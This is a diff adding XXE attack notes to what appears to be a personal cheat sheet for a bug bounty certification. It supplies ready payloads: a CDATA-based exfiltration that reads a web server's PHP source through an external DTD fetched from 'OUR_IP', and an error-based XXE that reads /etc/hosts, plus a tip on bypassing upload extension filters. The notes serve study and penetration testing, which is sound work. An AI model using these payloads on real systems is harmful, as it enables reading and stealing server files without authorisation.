@@ -191,4 +191,37 @@ Stuff for CBBH
 
     #When trying to bypass extension filter, this method `blah.php.jpg` is valid one, but it doens't work try `blah.jpg.php`
 
+XXE attack 
+
+    !!!REMINDER!!!
+    Don't forget that you may also use php wrapper with it.
+    
+    #Exfiltration with CDATA
+    Echo this => `echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd` to a file
+
+    <!DOCTYPE email [
+    <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
+    <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
+    <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
+    <!ENTITY % xxe SYSTEM "http://OUR_IP/xxe.dtd"> <!-- reference our external DTD -->
+    %xxe;
+    ]>
+
+    #Then reference the &joined; entity in the form you're attacking (you gotta identify which field, from the form, is reflected on the page)
+
+    #Error Based XXE - (This method is not as reliable as the previous one)
+
+    Create a file with this (error.dtd)
+    <!ENTITY % file SYSTEM "file:///etc/hosts">
+    <!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
+
+    #Then use the bellow payload in the request (strip off the form)
+
+    <!DOCTYPE email [ 
+    <!ENTITY % remote SYSTEM "http://OUR_IP/error.dtd">
+    %remote;
+    %error;
+    ]>
+
+
     
